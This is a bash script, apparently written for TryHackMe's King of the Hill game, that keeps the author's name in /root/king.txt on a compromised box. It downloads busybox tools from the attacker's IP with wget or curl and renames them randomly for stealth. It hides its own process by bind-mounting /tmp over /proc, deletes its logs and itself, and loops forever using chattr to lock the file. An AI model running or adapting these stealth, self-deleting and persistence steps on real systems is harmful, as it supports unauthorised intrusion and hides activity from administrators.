#!/bin/bash
#
# /$$   /$$ /$$$$$$ /$$   /$$  /$$$$$$        /$$      /$$ /$$$$$$$$
#| $$  /$$/|_  $$_/| $$$ | $$ /$$__  $$      | $$$    /$$$| $$_____/
#| $$ /$$/   | $$  | $$$$| $$| $$  \__/      | $$$$  /$$$$| $$      
#| $$$$$/    | $$  | $$ $$ $$| $$ /$$$$      | $$ $$/$$ $$| $$$$$   
#| $$  $$    | $$  | $$  $$$$| $$|_  $$      | $$  $$$| $$| $$__/   
#| $$\  $$   | $$  | $$\  $$$| $$  \ $$      | $$\  $ | $$| $$      
#| $$ \  $$ /$$$$$$| $$ \  $$|  $$$$$$/      | $$ \/  | $$| $$$$$$$$
#|__/  \__/|______/|__/  \__/ \______/       |__/     |__/|________/ v1.0                         
#
# Auto king script for THM KotH
# Written by Squ1rr3l (aka redsquirrel_7)
#
# DISCLAIMER: I'm pretty sure this isn't against the rules, but
# I am not responsible if you get banned for using this script!

WORKING_DIR=/var/kingme	# Secret working dir

# Parse them args!
POSITIONAL_ARGS=()

while [[ $# -gt 0 ]]; do
  case $1 in
    # Get the THM username to put in king.txt
    -u|--username)
      HACKER_NAME="$2"
      shift
      shift
      ;;
    # Get the IP address of the attacker machine for downloading bins/scripts
    -i|--ipaddr)
      HACKER_IP="$2"
      shift
      shift
      ;;
    # Get the secret working dir
    -d|--directory)
      WORKING_DIR="$2"
      shift
      shift
      ;;
    # Print some helper text
    -h|--help)
      echo -e "Usage: ./kingme.sh -u <thm username> -i <your ip> -d <directory>\n\n-u: Your TryHackMe username to put in king.txt\n-i: The IP address of your attacker machine (needed to copy bins)\n-d: Secret working directory for all your bins and the script to work out of. Defaults to /var/kingme."
      exit 1
      shift
      shift
      ;;
    # What the balls m8!? That's not an options!
    -*|--*)
      echo "Unknown option $1. Use -h for help"
      exit 1
      ;;
    *)
      POSITIONAL_ARGS+=("$1")
      shift
      ;;
  esac
done

set -- "${POSITIONAL_ARGS[@]}"

# Error checking (kind of)
if [ -z $HACKER_NAME ]
then
	echo "You need to enter a THM username and an IP address. Use -h for more help."
	exit 1
elif [ -z $HACKER_IP ]
then
	echo "You need to enter a THM username and an IP address. Use -h for more help."
	exit 1
fi

# Set us up a secret working directory
mkdir $WORKING_DIR
cd $WORKING_DIR

# Copy all the bins here and the kingme script as a backup

WGET=/usr/bin/wget
CURL=/usr/bin/curl

if [ -f "$WGET" ]; then
	chmod u+x /usr/bin/wget
	wget http://$HACKER_IP:8090/busybox_GREP
	wget http://$HACKER_IP:8090/busybox_ECHO
	wget http://$HACKER_IP:8090/busybox_CHATTR
	wget http://$HACKER_IP:8090/busybox_CHMOD
	wget http://$HACKER_IP:8090/busybox_CAT
	wget http://$HACKER_IP:8090/busybox_UMOUNT
elif [ -f "$CURL" ]; then
	chmod u+x /usr/bin/curl
	curl http://$HACKER_IP:8090/busybox_GREP > busybox_GREP
	curl http://$HACKER_IP:8090/busybox_ECHO > busybox_ECHO
	curl http://$HACKER_IP:8090/busybox_CHATTR > busybox_CHATR
	curl http://$HACKER_IP:8090/busybox_CHMOD > busybox_CHMOD
	curl http://$HACKER_IP:8090/busybox_CAT > busybox_CAT
	curl http://$HACKER_IP:8090/busybox_UMOUNT > busybox_UMOUNT
else
echo "Both 'wget' and 'curl' are not presented on the machine or cannot be executed."
echo "Abording.."
exit 1
fi

# Renaming all bind to random strings for better stealth
chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

GREP=
for i in {1..5} ; do
    GREP+=${chars:RANDOM%${#chars}:1}
done

ECHO=
for i in {1..6} ; do
    ECHO+=${chars:RANDOM%${#chars}:1}
done

CHATTR=
for i in {1..7} ; do
    CHATTR+=${chars:RANDOM%${#chars}:1}
done

CHMOD=
for i in {1..8} ; do
    CHMOD+=${chars:RANDOM%${#chars}:1}
done

CAT=
for i in {1..9} ; do
    CAT+=${chars:RANDOM%${#chars}:1}
done

UMOUNT=
for i in {1..10} ; do
    UMOUNT+=${chars:RANDOM%${#chars}:1}
done

# Rename them bins!
mv -v busybox_GREP $GREP
mv -v busybox_ECHO $ECHO
mv -v busybox_CHATTR $CHATTR
mv -v busybox_CHMOD $CHMOD
mv -v busybox_CAT $CAT
mv -v busybox_UMOUNT $UMOUNT

# All this stuff needs to be executable
chmod u+x $GREP
chmod u+x $ECHO
chmod u+x $CHATTR
chmod u+x $CHMOD
chmod u+x $CAT
chmod u+x $UMOUNT

# Hide from visible processes
$WORKING_DIR/$ECHO "Current PID:" $$
$WORKING_DIR/$ECHO "Hiding.."
mount -o bind /tmp /proc/$$

# Remove all wget-log files
rm -f $WORKING_DIR/wget-*

# This script will delete itself, so it cant be find with find or grep command!
script_name="$(basename $0)"
rm -f ./$script_name

# Forever take your rightful throne as king!!!
$WORKING_DIR/$ECHO -e "\n\nPress Enter to continue..\n"

while true
do
	if $WORKING_DIR/$GREP -q $HACKER_NAME /root/king.txt; then
	sleep 0.3
	else
		LOSER=$($WORKING_DIR/$CAT /root/king.txt)
		$WORKING_DIR/$ECHO -e "\n\n"$LOSER "dethroned you! Making" $HACKER_NAME "king once again!"
		$WORKING_DIR/$UMOUNT -l /root 2>/dev/null
		$WORKING_DIR/$CHATTR -ai /root/king.txt
		$WORKING_DIR/$CHMOD u+w /root/king.txt
		set +o noclobber /root/king.txt
		$WORKING_DIR/$ECHO $HACKER_NAME > /root/king.txt
		$WORKING_DIR/$CHATTR +ai /root/king.txt
		set -o noclobber /root/king.txt
                $WORKING_DIR/$ECHO -e $HACKER_NAME "is king! Nothing to do!\n"
	fi
	sleep 0.5
done
